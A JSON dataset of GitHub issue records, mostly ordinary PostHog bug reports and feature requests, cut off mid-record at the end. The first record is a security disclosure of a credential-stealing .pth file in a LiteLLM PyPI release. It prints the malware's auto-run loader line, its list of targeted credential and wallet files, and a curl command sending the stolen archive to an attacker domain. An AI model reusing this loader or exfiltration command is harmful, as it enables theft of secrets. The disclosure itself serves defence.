@@ -1,0 +1,222 @@
+{
+  "BerriAI/litellm#24512": {
+    "body": "[LITELLM TEAM] - For updates from the team, please see: https://github.com/BerriAI/litellm/issues/24518\n---\n# [Security]: CRITICAL: Malicious `litellm_init.pth` in litellm 1.82.8 PyPI package \u2014 credential stealer\n\n## Summary\n\nThe `litellm==1.82.8` wheel package on PyPI contains a malicious `.pth` file (`litellm_init.pth`, 34,628 bytes) that **automatically executes a credential-stealing script every time the Python interpreter starts** \u2014 no `import litellm` required.\n\nThis is a supply chain compromise. The malicious file is listed in the package's own `RECORD`:\n\n```\nlitellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628\n```\n\n## Reproduction\n\n```bash\npip download litellm==1.82.8 --no-deps -d /tmp/check\npython3 -c \"\nimport zipfile, os\nwhl = '/tmp/check/' + [f for f in os.listdir('/tmp/check') if f.endswith('.whl')][0]\nwith zipfile.ZipFile(whl) as z:\n    pth = [n for n in z.namelist() if n.endswith('.pth')]\n    print('PTH files:', pth)\n    for p in pth:\n        print(z.read(p)[:300])\n\"\n```\n\nYou will see `litellm_init.pth` containing:\n\n```python\nimport os, subprocess, sys; subprocess.Popen([sys.executable, \"-c\", \"import base64; exec(base64.b64decode('...'))\"])\n```\n\n## Malicious Behavior (full analysis)\n\nThe payload is **double base64-encoded**. When decoded, it performs the following:\n\n### Stage 1: Information Collection\n\nThe script collects sensitive data from the host system:\n\n- **System info**: `hostname`, `whoami`, `uname -a`, `ip addr`, `ip route`\n- **Environment variables**: `printenv` (captures all API keys, secrets, tokens)\n- **SSH keys**: `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, `~/.ssh/id_ecdsa`, `~/.ssh/id_dsa`, `~/.ssh/authorized_keys`, `~/.ssh/known_hosts`, `~/.ssh/config`\n- **Git credentials**: `~/.gitconfig`, `~/.git-credentials`\n- **AWS credentials**: `~/.aws/credentials`, `~/.aws/config`, IMDS token + security credentials\n- **Kubernetes secrets**: `~/.kube/config`, `/etc/kubernetes/admin.conf`, `/etc/kubernetes/kubelet.conf`, `/etc/kubernetes/controller-manager.conf`, `/etc/kubernetes/scheduler.conf`, service account tokens\n- **GCP credentials**: `~/.config/gcloud/application_default_credentials.json`\n- **Azure credentials**: `~/.azure/`\n- **Docker configs**: `~/.docker/config.json`, `/kaniko/.docker/config.json`, `/root/.docker/config.json`\n- **Package manager configs**: `~/.npmrc`, `~/.vault-token`, `~/.netrc`, `~/.lftprc`, `~/.msmtprc`, `~/.my.cnf`, `~/.pgpass`, `~/.mongorc.js`\n- **Shell history**: `~/.bash_history`, `~/.zsh_history`, `~/.sh_history`, `~/.mysql_history`, `~/.psql_history`, `~/.rediscli_history`\n- **Crypto wallets**: `~/.bitcoin/`, `~/.litecoin/`, `~/.dogecoin/`, `~/.zcash/`, `~/.dashcore/`, `~/.ripple/`, `~/.bitmonero/`, `~/.ethereum/keystore/`, `~/.cardano/`, `~/.config/solana/`\n- **SSL/TLS private keys**: `/etc/ssl/private/`, Let's Encrypt `.pem` and `.key` files\n- **CI/CD secrets**: `terraform.tfvars`, `.gitlab-ci.yml`, `.travis.yml`, `Jenkinsfile`, `.drone.yml`, `Anchor.toml`, `ansible.cfg`\n- **Database credentials**: PostgreSQL, MySQL, Redis, LDAP config files\n- **Webhook URLs**: grep for Slack/Discord webhook URLs in env and config files\n\n### Stage 2: Encryption & Exfiltration\n\n1. Collected data is written to a temporary file\n2. A random 32-byte AES-256 session key is generated via `openssl rand`\n3. The collected data is encrypted with `openssl enc -aes-256-cbc -pbkdf2`\n4. The AES session key is encrypted with a **hardcoded 4096-bit RSA public key** via `openssl pkeyutl -encrypt -pkeyopt rsa_padding_mode:oaep`\n5. Both encrypted files are packed into `tpcp.tar.gz`\n6. The archive is exfiltrated via:\n\n```bash\ncurl -s -o /dev/null -X POST \\\n  \"https://models.litellm.cloud/\" \\\n  -H \"Content-Type: application/octet-stream\" \\\n  -H \"X-Filename: tpcp.tar.gz\" \\\n  --data-binary @tpcp.tar.gz\n```\n\n## Key Technical Details\n\n- **Trigger mechanism**: `.pth` files in `site-packages/` are executed automatically by the Python interpreter on startup (see [Python docs on .pth files](https://docs.python.org/3/library/site.html)). No `import` statement is needed.\n- **Stealth**: The payload is double base64-encoded, making it invisible to naive source code grep.\n- **Exfiltration target**: `https://models.litellm.cloud/` \u2014 note the domain `litellm.cloud` (NOT `litellm.ai`, the official domain).\n- **RSA public key** (first 64 chars): `MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+...`\n\n## Impact\n\nAnyone who installed `litellm==1.82.8` via pip has had **all environment variables, SSH keys, cloud credentials, and other secrets** collected and sent to an attacker-controlled server.\n\nThis affects:\n- Local development machines\n- CI/CD pipelines\n- Docker containers\n- Production servers\n\n## Affected Version\n\n- **Confirmed**: `litellm==1.82.8` (PyPI wheel `litellm-1.82.8-py3-none-any.whl`)\n- **Other versions**: Not yet checked \u2014 the attacker may have compromised multiple releases\n\n## Recommended Actions\n\n1. **PyPI**: Yank/remove litellm 1.82.8 immediately\n2. **Users**: Check for `litellm_init.pth` in your `site-packages/` directory\n3. **Users**: Rotate ALL credentials that were present as environment variables or in config files on any system where litellm 1.82.8 was installed\n4. **BerriAI**: Audit PyPI publishing credentials and CI/CD pipeline for compromise\n\n## Environment\n\n- OS: Ubuntu 24.04 (Docker container)\n- Python: 3.13\n- pip installed from PyPI\n- Discovered: 2026-03-24\n",
+    "html_url": "https://github.com/BerriAI/litellm/issues/24512",
+    "labels": [
+      "llm translation",
+      "potential-duplicate"
+    ],
+    "state": "closed",
+    "title": "[Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 \u2014 credential stealer"
+  },
+  "PostHog/posthog#38461": {
+    "body": "### Feature request\n\n## Is your feature request related to a problem?\n\nSmoothing is available for line charts.\n\n## Describe the solution you'd like\n\nImplement smoothing for area charts too.\n\n## Describe alternatives you've considered\n\nUse a line chart.\n\n## Additional context\nFrom: https://posthoghelp.zendesk.com/agent/tickets/38390\n\n### Debug info\n\n```shell\nKind: support\n\nTarget area: analytics\n\nReport event: http://go/ticketByUUID/ec594666-cdd9-4980-bb8e-dcf1160db297\n\nSession: https://us.posthog.com/project/sTMFPsFhdP1Ssg/replay/01997241-eabc-79b2-b69d-607ab0d9b0dd?t=1080\n\nExceptions: https://us.posthog.com/project/2/error_tracking?filterGroup=%7B%22type%22%3A%22AND%22%2C%22values%22%3A%5B%7B%22type%22%3A%22AND%22%2C%22values%22%3A%5B%7B%22key%22%3A%22%24session_id%22%2C%22value%22%3A%5B%2201997241-eabc-79b2-b69d-607ab0d9b0dd%22%5D%2C%22operator%22%3A%22exact%22%2C%22type%22%3A%22event%22%7D%5D%7D%5D%7D\n\nLocation: https://us.posthog.com/project/200156/insights/5v34xzez/edit\n\nPersons-on-events mode for project: person_id_override_properties_on_events\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/38461",
+    "labels": [
+      "enhancement",
+      "feature/trends",
+      "team/product-analytics"
+    ],
+    "state": "closed",
+    "title": "Feature Request: Smoothing for area charts"
+  },
+  "PostHog/posthog#39943": {
+    "body": "### Feature request\n\n## Is your feature request related to a problem?\n\nIf you want to find events from a specific time - e.g. yesterday at 7am \u00b15 mins, it's not obvious how to do that from the UI.\n\n## Describe the solution you'd like\n\nEasier way to filter to a specific time range.\n\n## Describe alternatives you've considered\n\n- Using a SQL expression\n- Setting from 'x timestamp until now' and sorting on the timestamp column ascending\n\n## Additional context\nFrom: https://posthoghelp.zendesk.com/agent/tickets/40206\n\n### Debug info\n\n```shell\nnull\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/39943",
+    "labels": [
+      "enhancement",
+      "feature/property-filters"
+    ],
+    "state": "closed",
+    "title": "Feature Request: Make it easier to find activity from a specific time"
+  },
+  "PostHog/posthog#40472": {
+    "body": "Endpoint: `GET /environments/:id/groups/related?group_type_index=:idx&group_key:key`\n<img width=\"587\" height=\"317\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/47aa214b-068d-465e-8bf0-03d34efa52f9\" />\n\n## Question: why don't we have a concrete link between groups and persons? \n- Right now we need to go through events and figure out what person emitted an event associated with a group.\n- Why can't we have a db table with the relationship?",
+    "html_url": "https://github.com/PostHog/posthog/issues/40472",
+    "labels": [
+      "performance"
+    ],
+    "state": "closed",
+    "title": "Related people request takes forever"
+  },
+  "PostHog/posthog#41089": {
+    "body": "## Bug Report\n\n### Description\nThe PostHog MCP's `insight-update` tool can only set the `favorited` field but cannot set the `saved` field, which means insights updated via the MCP don't appear in the default Insights list view in the PostHog UI.\n\nOr even insights created via MCP are never in \"saved\" state so they dont show up in the insights view. Only accessible via link\n\n### Expected Behavior\nWhen creating or updating an insight via the MCP with `saved: true`, the insight should be marked as saved and appear in the default Insights list view.\n\n### Actual Behavior\n- Setting `saved: true` in the update data has no effect\n- Setting `favorited: true` works correctly  \n- Only insights with `saved=true` appear in the default Insights view\n- Insights updated via MCP remain with `saved=false` even when specifying `saved: true`\n\n### Steps to Reproduce\n1. Use the PostHog MCP `insight-update` tool\n2. Set `saved: true` in the data parameter\n3. Verify the insight using `insight-get` - the `saved` field remains `false`\n4. Check the Insights view in PostHog UI - the insight doesn't appear\n\n### Workaround\nManually clicking \"Save\" in the PostHog UI sets `saved=true` correctly.\n\n### Expected Fix\nThe MCP's `insight-update` tool should support setting the `saved` field, or provide documentation clarifying whether:\n1. `saved` is read-only and controlled by the UI only\n2. Or provide a different endpoint/method to mark insights as saved via API\n\n### Environment\n- PostHog MCP via Cursor IDE\n- Testing with programmatically created insights\n\n### Impact\nThis affects workflows where insights are created/updated programmatically and need to be visible in the default Insights list without manual UI intervention.",
+    "html_url": "https://github.com/PostHog/posthog/issues/41089",
+    "labels": [],
+    "state": "closed",
+    "title": "PostHog MCP: insight-update tool cannot set `saved` field, only `favorited`"
+  },
+  "PostHog/posthog#45378": {
+    "body": "### Bug Description\n\n*Please describe.*\n\nThe Posthog Toolbar has informational popups when viewing my pages, including links to Posthog. However, the \"Web Vitals\" link to the settings page doesn't work. It links to a non-existent settings page on my site instead of to the Posthog project settings page.\n\n## How to reproduce\n\n1. Ensure Web Vitals are disabled on your project\n2. Navigate to https://us.posthog.com/project/PROJECT_ID/toolbar\n3. Launch your website to see the Posthog toolbar overlay on your page\n4. Click on the \"Web Vitals\" option in the toolbar\n5. See the \"Web vitals are not enabled for this project so you won't see any data here...\" instructions\n6. Click on the \"Settings Page\" URL\n7. Notice this takes you to your own app page's URL suffixed with \"...settings/project\" instead of going to \"https://us.posthog.com/project/PROJECT_ID/settings/project\"\n\nScreenshot showing mouse hover over URL navigating to a non-existing page on my site:\n<img width=\"1044\" height=\"363\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/66dcf984-39bc-4491-a2bd-c83f4ab4835e\" />\n\nScreenshot showing the mouse hover over URL in the heatmaps section navigating to the proper URL\n<img width=\"1043\" height=\"426\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/fc6d4c89-f85d-472c-9e2d-75a557463f6c\" />\n\n## Additional context\n\n- This appears to be using the wrong URL used in the hyperlink [here](https://github.com/PostHog/posthog/blob/a1d8c0b8f1d577f8e83f3be6e4d110a65f442d67/frontend/src/toolbar/web-vitals/WebVitalsToolbarMenu.tsx#L34)\n\n\n- The other popup for heatmaps has the proper URL\n[here](https://github.com/PostHog/posthog/blob/a1d8c0b8f1d577f8e83f3be6e4d110a65f442d67/frontend/src/toolbar/stats/HeatmapToolbarMenu.tsx#L38)\n\n### Debug info\n\n```shell\n- [ X ] PostHog Cloud, Debug information: Session: https://us.posthog.com/project/sTMFPsFhdP1Ssg/replay/019bd78e-08e0-70e0-b5c6-1d187e6cd846?t=2272\nAdmin: http://go/adminOrgUS/019b2d2c-ce59-0000-0ae3-70c731602e1b\n\n\n- [ ] PostHog Hobby self-hosted with `docker compose`, version/commit: [please provide]\n- [ ] PostHog self-hosted with Kubernetes (deprecated, see [`Sunsetting Kubernetes support`](https://posthog.com/blog/sunsetting-helm-support-posthog)), version/commit: [please provide]\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/45378",
+    "labels": [
+      "bug"
+    ],
+    "state": "closed",
+    "title": "SUPPORT SUPERDAY Web vitals toolbar settings link doesn't navigate to the proper page"
+  },
+  "PostHog/posthog#46007": {
+    "body": "### Feature request\n\n## Is your feature request related to a problem?\n\nCurrently, when we navigate to a dashboard via the 'Pinned Dashboards' sidebar menu, the menu is narrow and the names of the dashboards are truncated and it can take an extra few seconds to know whether you have clicked on the right one by navigating to that dashboard.\n\n<img width=\"485\" height=\"373\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/217b7b0f-539e-46b4-8e5f-1b44703d0410\" />\n\n## Describe the solution you'd like\n\nEither, widen the menu itself on wide displays (1920w in this case) or when hovering over a menu item, show a tooltip of the full name of the dashboard.\n\n## Describe alternatives you've considered\n\n\n## Additional context\n\n\n\n\n\n### Debug info\n\n```shell\n- [ ] PostHog Cloud, Debug information: [please copy/paste from https://us.posthog.com/settings/project-details#variables]\n- [ ] PostHog Hobby self-hosted with `docker compose`, version/commit: [please provide]\n- [ ] PostHog self-hosted with Kubernetes (deprecated, see [`Sunsetting Kubernetes support`](https://posthog.com/blog/sunsetting-helm-support-posthog)), version/commit: [please provide]\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/46007",
+    "labels": [
+      "enhancement"
+    ],
+    "state": "closed",
+    "title": "Show a tooltip with the name of the Dashboard when navigating the sidebar menu"
+  },
+  "PostHog/posthog#46111": {
+    "body": "### Bug Description\n\niOS SDK (`v3.37.2`) generates uppercase session IDs (e.g., `019BFB8D-C548-75D3-B91C-36FE7BAE375A`), but the `sessions` table stores them lowercase (`019bfb8d-c548-75d3-b91c-36fe7bae375a`). When the Activity \u2192 Sessions tab UI queries for events using the lowercase ID from the sessions table, the case-sensitive match against the uppercase IDs in the events table returns nothing.\n\nResult: iOS sessions appear in the Sessions view but show 0 pageviews and no events\n\n**Confirmed via SQL:**\n- `WHERE $session_id = 'lowercase...'` \u2192 0 matches\n- `WHERE $session_id = 'UPPERCASE...'` \u2192 182 matches\n\n## How to reproduce\n\n1. Set up iOS SDK\n2. Generate some events\n3. Go to Activity \u2192 Sessions\n4. Note sessions appear with 0 pageviews\n5. Click a session - no events shown\n\n## Additional context\nFrom: https://posthoghelp.zendesk.com/agent/tickets/48428\n\n\n### Debug info\n\n```shell\nDebug info\nSession: https://us.posthog.com/project/sTMFPsFhdP1Ssg/replay/019c020f-5228-7df3-93eb-10dd79089b80?t=1263\nAdmin: http://go/adminOrgUS/019bd717-a62b-0000-3a65-4de533533ae6 (project ID 293704)\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/46111",
+    "labels": [
+      "bug",
+      "feature/session-analytics",
+      "Filters",
+      "team/analytics-platform"
+    ],
+    "state": "open",
+    "title": "Bug report: iOS sessions show 0 events in 'Activity \u2192 Sessions' due to session_id case mismatch"
+  },
+  "PostHog/posthog#46536": {
+    "body": "### Bug Description\n\n<img width=\"1124\" height=\"655\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4f6acd68-8e48-425d-a068-0b036c76d32c\" />\n\n### Debug info\n\n```shell\n- [ ] PostHog Cloud, Debug information: [please copy/paste from https://us.posthog.com/settings/project-details#variables or https://eu.posthog.com/settings/project-details#variables]\n- [ ] PostHog Hobby self-hosted with `docker compose`, version/commit: [please provide]\n- [x] PostHog self-hosted with Kubernetes (deprecated, see [`Sunsetting Kubernetes support`](https://posthog.com/blog/sunsetting-helm-support-posthog)), version/commit: [please provide]\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/46536",
+    "labels": [
+      "bug"
+    ],
+    "state": "open",
+    "title": "GitLab issue report"
+  },
+  "PostHog/posthog#46669": {
+    "body": "### Bug Description\n\n## Bug description\n\nDOMException: NotFoundError: Failed to execute 'removeChild' on 'Node': The node to be removed is not a child of this node.\n \nThis error is occurring in React's DOM cleanup process during component unmounting.\n \nIt is occurring a lot in many different parts of the PostHog app:\nhttps://us.posthog.com/project/2/error_tracking?dateRange=%7B%22date_from%22%3A%22-30d%22%2C%22date_to%22%3Anull%7D&searchQuery=NotFoundError%3A%20Failed%20to%20execute%20%27removeChild%27%20on%20%27Node%27%3A%20The%20node%20to%20be%20removed%20is%20not%20a%20child%20of%20this%20node.\n\nError occurs most frequently on the following pages (last 30 days):\n\n1. **Sessions page** (`/activity/sessions`) - 246 occurrences  \n2. **Replay settings** (`/settings/project-replay`) - 135 occurrences    \n3. **Billing overview** (`/organization/billing/overview`) - 120 occurrences  \n4. **Dashboards** - 73+ occurrences across multiple dashboards  \n5. **Web analytics** (`/web`) - 62 occurrences  \n6. **Error tracking page** - 45 occurrences\n\n## How to reproduce\n\nDepends on the area of the app.\n\n## Additional context\nFrom: https://posthoghelp.zendesk.com/agent/tickets/49129\n\n### Debug info\n\n```shell\nKind: bug\n\nTarget area: group_analytics\n\nReport event: http://go/ticketByUUID/06220c62-fb5a-4b80-bfdd-dbb6b9d0eca2\n\nSession: https://us.posthog.com/project/sTMFPsFhdP1Ssg/replay/019c1eb5-447b-707f-be65-8617f083d31d?t=153\n\nExceptions: https://us.posthog.com/project/2/error_tracking?filterGroup=%7B%22type%22%3A%22AND%22%2C%22values%22%3A%5B%7B%22type%22%3A%22AND%22%2C%22values%22%3A%5B%7B%22key%22%3A%22%24session_id%22%2C%22value%22%3A%5B%22019c1eb5-447b-707f-be65-8617f083d31d%22%5D%2C%22operator%22%3A%22exact%22%2C%22type%22%3A%22event%22%7D%2C%7B%22type%22%3A%22hogql%22%2C%22key%22%3A%22uuid%20%3D%20'019c1eb6-846d-7ba3-a57e-75a3199edfb7'%22%2C%22value%22%3Anull%7D%5D%7D%5D%7D\n\nLocation: https://us.posthog.com/project/254092/dashboard/792583#panel=max%3Abug%3Agroup_analytics%3Ahigh%3Atrue\n\nPersons-on-events mode for project: person_id_override_properties_on_events\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/46669",
+    "labels": [
+      "bug",
+      "team/product-analytics"
+    ],
+    "state": "open",
+    "title": "Bug: Error in React's DOM cleanup process"
+  },
+  "PostHog/posthog#47199": {
+    "body": "## Context\n\nTrace summarization Temporal workflows block LLMA worker pods when processing teams with large traces (team 2 is the main offender). The CPU-intensive Python formatting holds the GIL, blocking heartbeats, logging, and all other worker activity for 10+ minutes per trace.\n\n## What we've deployed so far\n\nThree incremental fixes have been merged and deployed:\n\n1. **`truncated: True`** (#47188) \u2014 Individual content blocks within events are now truncated to 1000 chars during formatting. Previously `truncated: False` was a bug that let content grow unbounded.\n\n2. **`MAX_RAW_TRACE_SIZE = 5M`** (#47188) \u2014 Raw size guard in the summarization activity. Estimates `sum(len(str(properties)))` per event before formatting. Traces exceeding 5M chars are skipped with `skip_reason=\"trace_too_large\"`.\n\n3. **`MAX_TRACE_EVENTS_LIMIT = 50`** (#47192) \u2014 Event count filter in the trace sampling HogQL query. Traces with >50 events are excluded at the ClickHouse level via `HAVING event_count <= 50`, before reaching the activity.\n\n## What's still broken\n\nEven with all three fixes, team 2 traces with <=50 events still peg worker CPU at 1000m+ with zero log output. The bottleneck is not event count alone \u2014 team 2 events have massive individual properties, so even 30-event traces produce megabytes of data that choke `format_trace_text_repr`.\n\n## Remaining work\n\n### 1. Fix `batch_size` in scheduled workflows\n\nThe registered schedules still use `batch_size=5` (5 parallel summarization activities). PR #47176 added `DEFAULT_TRACE_BATCH_SIZE = 1` but the `trace_batch_size` field never made it to the deployed `BatchSummarizationInputs` model. Options:\n- Change `DEFAULT_BATCH_SIZE` from 5 to 1 (affects all analysis levels)\n- Land the `trace_batch_size` field properly so traces run sequentially while generations can still batch\n\nWith batch_size=5, a single problematic team can saturate all activity slots on a pod.\n\n### 2. More aggressive trace filtering\n\nThe 50-event limit isn't enough for team 2. Options:\n- Lower `MAX_TRACE_EVENTS_LIMIT` further (10-15)\n- Add a raw-size estimate to the sampling query itself (e.g. `sum(length(toString(properties))) as raw_size` with a `HAVING` clause) so oversized traces are excluded before the activity even starts\n- Combine both: event count + estimated size in sampling\n\n### 3. Break out of the GIL (longer term)\n\nThe fundamental problem is that `format_trace_text_repr` is CPU-bound Python that holds the GIL, blocking the asyncio event loop. Options:\n- `ProcessPoolExecutor` to run formatting in a subprocess (breaks GIL isolation)\n- Move formatting to an async-friendly implementation\n- Split the activity: fetch trace in one activity, format + summarize in another with tighter timeouts\n\n## Current state of schedules\n\n- `llma-trace-summarization-coordinator-schedule`: **unpaused** (hourly)\n- `llma-generation-summarization-coordinator-schedule`: **unpaused** (hourly)\n- Clustering schedules: were never paused, running normally\n\nMost teams (~210) work fine. Team 2 is the main outlier that will continue to fail/timeout until the above fixes land.\n\n## Key files\n\n- `posthog/temporal/llm_analytics/trace_summarization/constants.py` \u2014 all limits and timeouts\n- `posthog/temporal/llm_analytics/trace_summarization/sampling.py` \u2014 sampling query with event count filter\n- `posthog/temporal/llm_analytics/trace_summarization/summarization.py` \u2014 activity with raw size check\n- `products/llm_analytics/backend/text_repr/formatters/trace_formatter.py` \u2014 the CPU-bound formatting code\n\n## Related PRs\n\n- #47176 \u2014 batch_size=1 for traces (model field issue)\n- #47188 \u2014 truncation fix + raw size guard\n- #47192 \u2014 event count filter in sampling",
+    "html_url": "https://github.com/PostHog/posthog/issues/47199",
+    "labels": [
+      "bug",
+      "team/llm-analytics"
+    ],
+    "state": "closed",
+    "title": "fix(llma): trace summarization still pegs CPU for teams with large traces"
+  },
+  "PostHog/posthog#48130": {
+    "body": "### Feature request\n\n## Is your feature request related to a problem?\n\ntours dismiss on outside clicks, announcements and banners do not, and it's not configurable\n\n## Describe the solution you'd like\n\nmake it configurable!\n\n## Additional context\n\nthese are already independent properties in code - they are just not exposed for editing\n\n### Debug info\n\n```shell\n- [ ] PostHog Cloud, Debug information: [please copy/paste from https://us.posthog.com/settings/project-details#variables]\n- [ ] PostHog Hobby self-hosted with `docker compose`, version/commit: [please provide]\n- [ ] PostHog self-hosted with Kubernetes (deprecated, see [`Sunsetting Kubernetes support`](https://posthog.com/blog/sunsetting-helm-support-posthog)), version/commit: [please provide]\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/48130",
+    "labels": [
+      "enhancement"
+    ],
+    "state": "closed",
+    "title": "Product Tours - configurable 'dismiss on click outside'"
+  },
+  "PostHog/posthog#49255": {
+    "body": "## Problem\n\n`FlagsCanonicalLogLine` mixes request-level metadata with per-flag evaluation counters in a single flat struct. `merge_rayon_delta` must explicitly list every evaluation counter field to merge rayon thread-local deltas back into the request log.\nIf someone adds a new eval counter and writes it via `with_canonical_log` inside `evaluate_single_flag` but forgets to add it to `merge_rayon_delta`, the counter silently stays at zero \u2014 re-introducing the original no-op bug for that field.\n\n## Proposal\n\nSplit the evaluation counters into an `EvalCounters` sub-struct:\n\n```rust\npub struct EvalCounters {\n    pub flags_device_id_bucketing: usize,\n    pub cohorts_evaluated: usize,\n    pub property_cache_hits: usize,\n    pub property_cache_misses: usize,\n    pub person_properties_not_cached: bool,\n    pub group_properties_not_cached: bool,\n}\n```\n\nThen `FlagsCanonicalLogLine` embeds `pub eval: EvalCounters`, and `merge_rayon_delta` becomes a single method on `EvalCounters` with no field list to maintain.\nNew counters added to `EvalCounters` would automatically be merged.",
+    "html_url": "https://github.com/PostHog/posthog/issues/49255",
+    "labels": [],
+    "state": "closed",
+    "title": "Extract `EvalCounters` sub-struct from `FlagsCanonicalLogLine`"
+  },
+  "PostHog/posthog#50712": {
+    "body": "## Context\n\nPR #49751 decoupled evaluation contexts from tags by introducing new `EvaluationContext`, `FeatureFlagEvaluationContext`, and `TeamDefaultEvaluationContext` models. The old tag-based models (`FeatureFlagEvaluationTag`, `TeamDefaultEvaluationTag`) are no longer written to but are kept for backward compatibility during the transition.\n\n## Cleanup tasks (after PR #49751 has baked in production)\n\n- [ ] Drop `FeatureFlagEvaluationTag` model and table\n- [ ] Drop `TeamDefaultEvaluationTag` model and table  \n- [ ] Remove `evaluation_tags` deprecated field from API response (keep only `evaluation_contexts`)\n- [ ] Remove old migrations: `0864_create_feature_flag_evaluation_tag_table.py`, `0882_add_team_default_evaluation_tags.py`\n- [ ] Clean up orphaned `EvaluationContext` rows that are no longer referenced by any flag\n- [ ] Update tests that still reference the old models\n\n## Prerequisites\n\n- [ ] PR #49751 merged and deployed to production\n- [ ] Data migration (1046) has run successfully in production\n- [ ] Verification that all existing evaluation tags were migrated to evaluation contexts\n- [ ] ~2 weeks bake time to ensure no issues\n\n## Related\n\n- PR #49751: Decouple evaluation contexts from tags",
+    "html_url": "https://github.com/PostHog/posthog/issues/50712",
+    "labels": [
+      "enhancement"
+    ],
+    "state": "open",
+    "title": "chore: clean up deprecated FeatureFlagEvaluationTag model after eval-context-rearch bakes"
+  },
+  "PostHog/posthog#51776": {
+    "body": "## Bug description\n\nThe \"Use person properties from query time\" toggle does not work when editing an insight from within a notebook. Note that this is for an insight which has been detached from the original insight. If the insight remains attached to the original, you can still go in and edit the original insight, and it will reflect on the notebook.\n\nhttps://github.com/user-attachments/assets/e2ce041d-2efc-433b-9568-35972a817ea0\n\n## How to reproduce\n\n1. Create a notebook\n2. Add an insight\n3. Edit the insight\n4. Select advanced options\n5. Toggle on \"Use person properties from query time\"\n\n## Additional context\nFrom: https://posthoghelp.zendesk.com/agent/tickets/53658",
+    "html_url": "https://github.com/PostHog/posthog/issues/51776",
+    "labels": [
+      "bug"
+    ],
+    "state": "open",
+    "title": "Bug: Can't enable \"Use person properties from query time\" from within a notebook"
+  },
+  "PostHog/posthog#51819": {
+    "body": "### Bug Description\n\n## Please describe.\n\nWhen a Postgres source sync fails with a transient connection error (e.g. connection pool exhaustion), the schema's syncing is permanently disabled (`should_sync` set to `False`). Syncs don't resume until a user manually updates the source configuration.\n\nThis happens because the non-retryable error list in `PostgresSource.get_non_retryable_errors()` includes the pattern:\n\n`\"OperationalError: connection failed: connection to server at\"`\n\nIntended to catch permanent connection failures (wrong host, firewall, etc.), but it also substring-matches transient errors like Supabase/PgBouncer pool exhaustion, e.g.:\n\n`OperationalError: connection failed: connection to server at \"52.209.89.87\", port 5432 failed: FATAL: MaxClientsInSessionMode: max clients reached - in Session mode max clients are limited to pool_size`\n\nThe matching logic in `external_data_job.py` (`update_external_data_job_model`) calls `update_should_sync(should_sync=False)` on any match, which permanently stops syncs for that schema.\n\n**Relevant code:**\n- `posthog/temporal/data_imports/sources/postgres/source.py` (non-retryable error list)\n- `posthog/temporal/data_imports/external_data_job.py` (matching + disable logic)\n\n## How to reproduce\n\n1. Link a Postgres source (e.g. Supabase) with multiple schemas enabled\n2. Wait for the source DB to temporarily hit its connection pool limit during a sync\n3. Note that he affected schema's sync fails and is permanently disabled until manually restarted by the customer\n(Other schemas on the same source continue syncing normally)\n## Additional context\nFrom: https://posthoghelp.zendesk.com/agent/tickets/53394\n\n\n### Debug info\n\n```shell\nSession: https://us.posthog.com/project/sTMFPsFhdP1Ssg/replay/019d0c83-6f20-7501-bbb6-97af2feb174d?t=200\nAdmin: http://go/adminOrgUS/019a2f44-ec21-0000-2d2b-53a5221b9e8b (project ID 240542)\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/51819",
+    "labels": [
+      "bug",
+      "team/data-warehouse",
+      "feature/pipelines"
+    ],
+    "state": "open",
+    "title": "Bug report: Transient Postgres connection errors permanently disable schema syncing"
+  },
+  "PostHog/posthog#51843": {
+    "body": "### Feature request\n\nDespite the rarity of me saying it there's a good chance we should completely rewrite the taxonomic filter, but ahead of instead of that\n\nthe different shape of filter data used by replay is problematic both in that it adds complexity to building but also confuses the robot\n\nthe code started scarily complicated and remains one of the most accidentally complex parts of the system, it's nasty to work with, and folk are starting to build filtering alongside it as a result\n\n- [x] make searching nicer so you can see across taxonomic groups instead of only ever one group\n- [x] promote searching by screen name, email, url in more places \n- [x] track recent filters so that you can quickly get back to your common items (partially rolled out)\n- [ ] let people pin properties (necessary for removing person pinning from the magic replay home page)\n- [x] need to review order of groups in different scenes since we promote based on that order (https://github.com/PostHog/posthog/pull/51844)\n- [ ] bunch of react testing library tests so agents have a fast executable spec\n- [ ] promote pinned properties alongside recents in the suggested filters taxonomic group\n- [ ] create a proper replay taxonomic group (necessary for removing the recording filter shape\n- [ ] make the replay tab a standard local taxonomic group\n- [ ] migrate replay to \"normal\" filters\n- [ ] refactor the code to be nicer to work with\n- [ ] make sure we're measuring time-to-see data for the property values\n- [ ] improve speed of search the most common are probably the slowest \n\n### Debug info\n\n```shell\n\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/51843",
+    "labels": [
+      "enhancement"
+    ],
+    "state": "open",
+    "title": "Taxonomic Filter 2500"
+  },
+  "PostHog/posthog#52017": {
+    "body": "## Problem\n\nThe feature-flags Rust service evaluates flags on the read path for every `/decide` request. The current data model is a deeply nested tree of heap-allocated objects (`Vec<FeatureFlag>` containing `Vec<FlagPropertyGroup>` containing `Option<Vec<PropertyFilter>>`), which results in scattered memory access patterns, redundant cloning during filter partitioning, and repeated parsing of property values on every evaluation.\n\nAs flag counts and filter complexity grow, these inefficiencies compound. We should explore whether Data Oriented Design techniques can meaningfully improve evaluation throughput and latency.\n\n## Goal\n\nInvestigate DOD strategies, implement them behind opt-in paths using the custom canary, and run benchmarks against realistic workloads to measure actual impact. None of these are commitments, only hypotheses to validate with data.\n\n## Ideas to explore\n\n- **Flat filter store**: Instead of nested `Vec`s, pack all `PropertyFilter` data into a single contiguous array and reference slices via index ranges from parent structures. This could improve cache locality and eliminate the clone-partition overhead in `is_condition_match()`.\n- **Pre-parsed property values**: Parse filter values (numbers, regexes, semver) once at cache-load time instead of 